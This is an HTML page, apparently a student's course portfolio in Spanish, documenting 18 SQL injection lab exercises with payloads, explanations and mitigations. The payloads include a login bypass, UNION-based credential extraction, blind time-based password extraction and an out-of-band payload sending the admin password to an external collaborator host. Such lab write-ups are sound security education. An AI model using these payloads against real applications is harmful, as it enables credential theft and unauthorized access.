@@ -1,0 +1,662 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>Portafolio Digital | SQL Injection Roadmap</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="assets/css/fontawesome-all.min.css" />
+    <link rel="stylesheet" href="assets/css/main.css" />
+    <style>
+        /* ESTILO PERSONALIZADO PARA EL MENÚ TIPO BARRA NEGRA */
+        #nav {
+            background-color: #000000 !important;
+            color: #ffffff !important;
+            padding: 0.5em 0;
+            position: relative;
+        }
+
+        #nav ul li a {
+            color: #ffffff !important;
+            font-weight: bold;
+            border-radius: 4px;
+        }
+
+        #nav ul li a:hover {
+            background-color: #333333;
+        }
+
+        /* Roadmap CSS Details */
+        hr {
+            border-top: solid 1px #ccc !important;
+            opacity: 1;
+            margin: 2em 0;
+        }
+
+        .content-article {
+            background: #ffffff;
+            padding: 3em;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+        }
+
+        .cover-info {
+            text-align: center;
+            margin-bottom: 3em;
+            padding: 2em;
+            background: #f9f9f9;
+            border-radius: 8px;
+            border-bottom: 4px solid #ce283b; /* Ajustado el color para SQLi / Hacking */
+        }
+
+        .cover-info h1 {
+            font-size: 2.2em;
+            color: #2c3e50;
+            margin-bottom: 0.5em;
+        }
+
+        .cover-info p {
+            margin: 0.2em 0;
+            color: #555;
+            font-size: 1.1em;
+        }
+        
+        /* Phase Styles */
+        .phase-header {
+            background-color: #34495e;
+            color: #fff !important;
+            padding: 10px 20px;
+            border-radius: 5px;
+            margin-top: 2.5em;
+            margin-bottom: 1.5em;
+            display: inline-block;
+            font-size: 1.4em;
+        }
+
+        .lab-card {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 2em;
+            background: #fafafa;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+
+        .lab-card:hover {
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            transform: translateY(-2px);
+        }
+
+        .lab-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1em;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+        }
+
+        .lab-header h3 {
+            margin: 0;
+            color: #c0392b;
+            font-size: 1.3em;
+            flex: 1;
+        }
+
+        .lab-badge {
+            background: #e74c3c;
+            color: #fff;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 0.8em;
+            font-weight: bold;
+            display: inline-block;
+            margin-left: 10px;
+        }
+        
+        .lab-badge.practitioner {
+            background: #e67e22;
+        }
+
+        .lab-details {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .lab-item {
+            font-size: 0.95em;
+            color: #333;
+        }
+
+        .lab-item strong {
+            color: #2c3e50;
+        }
+
+        .payload-box {
+            background: #2d3436;
+            color: #00b894;
+            padding: 10px 15px;
+            border-radius: 4px;
+            font-family: monospace;
+            overflow-x: auto;
+            margin-top: 10px;
+            border-left: 4px solid #0984e3;
+            letter-spacing: 0.5px;
+        }
+        
+        .evidence-box {
+            border: 2px dashed #ccc;
+            background: #fff;
+            padding: 20px;
+            text-align: center;
+            border-radius: 6px;
+            margin-top: 15px;
+            color: #7f8c8d;
+        }
+        
+        .evidence-box i {
+            display: block;
+            font-size: 2em;
+            color: #bdc3c7;
+            margin-bottom: 10px;
+        }
+
+        .pdf-btn {
+            background-color: #2980b9;
+            color: white !important;
+            padding: 12px 25px;
+            text-decoration: none;
+            border-radius: 5px;
+            display: inline-block;
+            margin-top: 3em;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: background 0.3s;
+        }
+
+        .pdf-btn:hover {
+            background-color: #1c5980;
+        }
+        
+        .mitigation-box {
+            background: #ecf0f1;
+            border-left: 4px solid #f1c40f;
+            padding: 10px;
+            margin-top: 15px;
+            border-radius: 4px;
+            font-style: italic;
+        }
+
+    </style>
+</head>
+
+<body class="is-preload">
+
+    <nav id="nav">
+        <ul class="container">
+            <li><a href="index.html">Inicio</a></li>
+            <li><a href="PF02.html">PF02</a></li>
+            <li><a href="PF03.html">PF03</a></li>
+            <li><a href="Final.html">Final</a></li>
+            <li><a href="actividades.html">Actividades</a></li>
+            <li><a href="proyectos.html">Proyectos</a></li>
+            <li><a href="halloffame.html">Hall of Fame</a></li>
+        </ul>
+    </nav>
+
+    <article id="top" class="wrapper style1">
+        <div class="container">
+            <header>
+                <p style="text-align: left;"><a href="halloffame.html">← Volver al Hall of Fame</a></p>
+                <h2>Road To Hall of Fame</h2>
+                <p>SQL Injection Roadmap - Actividad 08</p>
+            </header>
+
+            <div class="row">
+                <div class="col-12">
+                    <div class="content-article">
+                        <!-- Cover Content -->
+                        <div class="cover-info">
+                            <h1><i class="fas fa-database"></i> SQL Injection Labs Roadmap</h1>
+                            <p><strong>Materia:</strong> CNO V: Seguridad Informática</p>
+                            <p><strong>Alumno:</strong> Alonso Castillo Omar Karim (179033)</p>
+                            <p><strong>Foco Secundario:</strong> Road to Hall of Fame</p>
+                        </div>
+
+                        <hr />
+                        <p style="font-size: 1.1em; text-align: justify; margin-bottom: 2em;">
+                            Bienvenidos al módulo <strong>Road to Hall of Fame</strong> enfocado en <strong>SQL Injection</strong>. Este apartado presenta una arquitectura de progreso a través de los diversos laboratorios prácticos superados durante el curso, englobando las fases críticas desde métodos in-band booleanos hasta evasión avanzada WAF y técnicas Out-of-Band (OAST). A continuación se documenta el progreso estructurado de los 18 retos vulnerables y analizados, detallando la evidencia, cargas maliciosas utilizadas (payloads) y las mitigaciones teóricas requeridas.
+                        </p>
+
+                        <!-- PHASE 1 -->
+                        <h2 class="phase-header"><i class="fas fa-flag"></i> Fase 1: SQLi Beginner (Fundamentos)</h2>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>1. Lab: SQLi in WHERE clause (Hidden data)</h3>
+                                <div class="lab-badge">Apprentice</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> In-band (Booleano)</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Visualizar productos no publicados.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Falta de sanitización en el parámetro category, permitiendo alterar la lógica de la consulta mediante operadores lógicos.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: ' OR 1=1--
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Uso de consultas parametrizadas (Prepared Statements).
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab1.png" alt="Evidencia lab1.png" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>2. Lab: SQLi login bypass</h3>
+                                <div class="lab-badge">Apprentice</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> In-band (Autenticación)</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Acceder como administrador sin conocer la contraseña.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Vulnerabilidad en el formulario de login que permite truncar la verificación de credenciales.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: administrator'--
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Deshabilitar la construcción dinámica de queries en procesos de login.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab2.PNG" alt="Evidencia lab2.PNG" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <!-- PHASE 2 -->
+                        <h2 class="phase-header"><i class="fas fa-bolt"></i> Fase 2: UNION-Based SQLi (Exfiltración)</h2>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>3. Lab: SQLi UNION attack (Determining columns)</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> UNION-based</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Determinar cuántas columnas devuelve la consulta original.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Uso de la cláusula UNION para inyectar una consulta adicional con el mismo número de columnas.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: ' ORDER BY 3--
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Implementar validación estricta de tipos de datos en parámetros de entrada.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab3.png" alt="Evidencia lab3.png" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>4. Lab: SQLi UNION attack (Finding useful columns)</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> UNION-based</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Identificar qué columna acepta datos de tipo texto.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Prueba sistemática de columnas para encontrar una compatible con strings para extraer datos.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: ' UNION SELECT 'abc',NULL,NULL--
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Aplicar el principio de menor privilegio en la cuenta de la base de datos.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab4.png" alt="Evidencia lab4.png" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>5. Lab: SQLi UNION attack (Retrieving data)</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> UNION-based</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Extraer nombres de usuario y contraseñas de la tabla users.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Ejecución de una segunda consulta que recupera datos sensibles de una tabla distinta.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: ' UNION SELECT username, password FROM users--
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Evitar mostrar errores detallados de la base de datos al usuario final.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab5.PNG" alt="Evidencia lab5.PNG" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>6. Lab: SQLi UNION attack (Multiple values in one column)</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> UNION-based</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Extraer múltiples datos cuando solo hay una columna de texto disponible.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Concatenación de múltiples campos para que se muestren como un solo resultado.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: ' UNION SELECT NULL, username || '~' || password FROM users--
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Sanitizar caracteres especiales y delimitadores en las entradas.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab6.PNG" alt="Evidencia lab6.PNG" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <!-- PHASE 3 -->
+                        <h2 class="phase-header"><i class="fas fa-fingerprint"></i> Fase 3: Database Fingerprinting (Versiones)</h2>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>7. Lab: SQLi querying version (Oracle)</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> In-band (Oracle)</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Identificar la versión de la base de datos Oracle.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Inyección de consultas específicas hacia tablas del sistema (como v$version).</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: ' UNION SELECT banner, NULL FROM v$version--
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Ocultar banners de versión y metadatos del servidor.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab7.PNG" alt="Evidencia lab7.PNG" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>8. Lab: SQLi querying version (MySQL/Microsoft)</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> In-band (MySQL/MSSQL)</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Obtener la versión en entornos no Oracle.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Uso de variables globales o funciones integradas propias del motor.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: ' UNION SELECT @@version, NULL%23
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Uso de WAF para detectar firmas de consultas a variables de sistema.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab8.PNG" alt="Evidencia lab8.PNG" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <!-- PHASE 4 -->
+                        <h2 class="phase-header"><i class="fas fa-eye-slash"></i> Fase 4: Blind SQLi (Inferencia)</h2>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>9. Lab: Blind SQLi with conditional responses</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> Blind (Booleano)</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Recuperar la contraseña del admin analizando la respuesta de la página.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> La aplicación no muestra datos, pero su respuesta varía (ej: mensaje "Welcome") según si la condición es verdadera.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> No variar el contenido de la respuesta basado en el éxito de una subconsulta interna.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab9.PNG" alt="Evidencia lab9.PNG" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>10. Lab: Blind SQLi with conditional errors</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> Blind (Error-based)</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Exfiltrar datos provocando errores controlados.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Uso de funciones como TO_CHAR(1/0) para forzar un error si una condición se cumple.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Configuración de páginas de error genéricas que no revelen el estado de la DB.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab10.PNG" alt="Evidencia lab10.PNG" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>11. Lab: Blind SQLi with time delays</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> Blind (Time-based)</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Confirmar la vulnerabilidad mediante pausas en la respuesta.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Uso de funciones de retardo (sleep) para detectar la ejecución de comandos.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: '; IF (1=1) WAITFOR DELAY '0:0:10'--
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Limitar el tiempo de ejecución de las consultas en el servidor de aplicaciones.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab11.PNG" alt="Evidencia lab11.PNG" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>12. Lab: Blind SQLi with time delays (Data exfiltration)</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> Blind (Time-based)</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Extraer la contraseña midiendo tiempos de respuesta.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Se condiciona el retraso de tiempo a que un carácter de la contraseña sea correcto.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: '%3bIF+(username='administrator'+AND+substring(password,1,1)='a')+WAITFOR+DELAY+'0:0:10'--
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Implementar detección de anomalías de tiempo y rate limiting.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab12.PNG" alt="Evidencia lab12.PNG" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <!-- PHASE 5 -->
+                        <h2 class="phase-header"><i class="fas fa-shield-virus"></i> Fase 5: OAST y Evasión Avanzada</h2>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>13. Lab: SQLi via cookie manipulation</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> Blind (Inyección en cabeceras)</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Explotar una vulnerabilidad en un campo no visible (Cookie de rastreo).</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Inyección en vectores secundarios que a menudo tienen menos seguridad que los formularios.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: TrackingId=xyz' AND (SELECT 1 FROM users WHERE username='admin')='1
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Tratar todos los datos provenientes del cliente (incluidas Cookies) como inseguros.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab13.PNG" alt="Evidencia lab13.PNG" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>14. Lab: SQLi with out-of-band (OAST)</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> Out-of-band</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Extraer datos mediante interacciones DNS/HTTP externas.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Se fuerza a la base de datos a realizar una petición externa para enviar el dato.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: '+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%21entity+%25+remote+SYSTEM+"http://'+(SELECT+password+FROM+users+WHERE+username='administrator')+'.burpcollaborator.net/"&gt;%25remote%3b'),'/l')+FROM+dual--
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Restringir el tráfico de salida (egress) desde el servidor de base de datos.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab14.PNG" alt="Evidencia lab14.PNG" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>15. Lab: SQLi with WAF Bypass (Hex Encoding)</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> In-band (Evasión)</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Superar la protección de un WAF para extraer credenciales.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Uso de codificación hexadecimal y entidades XML para que el WAF no reconozca el payload SQL.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: UNION SELECT (codificado en Hex mediante la extensión Hackvertor)
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Configurar el WAF para decodificar múltiples capas antes de inspeccionar.
+                            </div>
+                            <div class="evidence-box" style="padding: 0; background: transparent; border: none;">
+                                <img src="images/lab15.PNG" alt="Evidencia lab15.PNG" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" />
+                            </div>
+                        </div>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>16. Lab: SQLi in JSON parameters</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> In-band (NoSQL/JSON Context)</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Manipular datos estructurados en formato JSON.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Inyección dentro de una cadena JSON enviada vía POST que el backend procesa directamente en SQL.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: {"id": "1' OR 1=1--"}
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Deserialización segura y tipado fuerte en objetos JSON.
+                            </div>
+                            <div class="evidence-box">
+                                <i class="fas fa-image"></i>
+                                <span>[Evidencia Gráfica del Laboratorio - Pendiente Inserción]</span>
+                            </div>
+                        </div>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>17. Lab: SQLi with string concatenation bypass</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> In-band (Evasión)</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Evadir filtros que bloquean espacios o palabras clave.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Uso de operadores de concatenación (||, +, CONCAT) para reconstruir comandos.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: 'UNION/**/SELECT/**/NULL,username%7C%7C'~'%7C%7Cpassword/**/FROM/**/users--
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Implementar una "Lista Blanca" de caracteres permitidos.
+                            </div>
+                            <div class="evidence-box">
+                                <i class="fas fa-image"></i>
+                                <span>[Evidencia Gráfica del Laboratorio - Pendiente Inserción]</span>
+                            </div>
+                        </div>
+
+                        <div class="lab-card">
+                            <div class="lab-header">
+                                <h3>18. Lab: SQLi for privilege escalation</h3>
+                                <div class="lab-badge practitioner">Practitioner</div>
+                            </div>
+                            <div class="lab-details">
+                                <div class="lab-item"><strong>Tipo:</strong> In-band (Escalada)</div>
+                                <div class="lab-item"><strong>Objetivo:</strong> Cambiar el rol del usuario actual a administrador.</div>
+                                <div class="lab-item"><strong>Explicación:</strong> Explotación de una vulnerabilidad de actualización (UPDATE) para modificar registros de control.</div>
+                            </div>
+                            <div class="payload-box">
+                                Payload: ', role='admin' WHERE username='wiener'--
+                            </div>
+                            <div class="mitigation-box">
+                                <strong>Mitigación:</strong> Separación estricta de privilegios y validación de permisos a nivel de fila.
+                            </div>
+                            <div class="evidence-box">
+                                <i class="fas fa-image"></i>
+                                <span>[Evidencia Gráfica del Laboratorio - Pendiente Inserción]</span>
+                            </div>
+                        </div>
+
+                        <!-- Export Button -->
+                        <div style="text-align: center; margin-top: 3em;">
+                            <a href="Actividades/Laboratorios.pdf" class="pdf-btn" download>
+                                <i class="icon solid fa-file-pdf"></i> Descargar Documento de Laboratorios
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <article class="wrapper style4">
+        <div class="container medium">
+            <footer>
+                <ul id="copyright">
+                    <li>&copy; Alonso Castillo Omar Karim. Todos los derechos reservados.</li>
+                    <li>Diseño base: <a href="http://html5up.net">HTML5 UP</a></li>
+                </ul>
+            </footer>
+        </div>
+    </article>
+
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/jquery.scrolly.min.js"></script>
+    <script src="assets/js/browser.min.js"></script>
+    <script src="assets/js/breakpoints.min.js"></script>
+    <script src="assets/js/util.js"></script>
+    <script src="assets/js/main.js"></script>
+
+</body>
+
+</html>
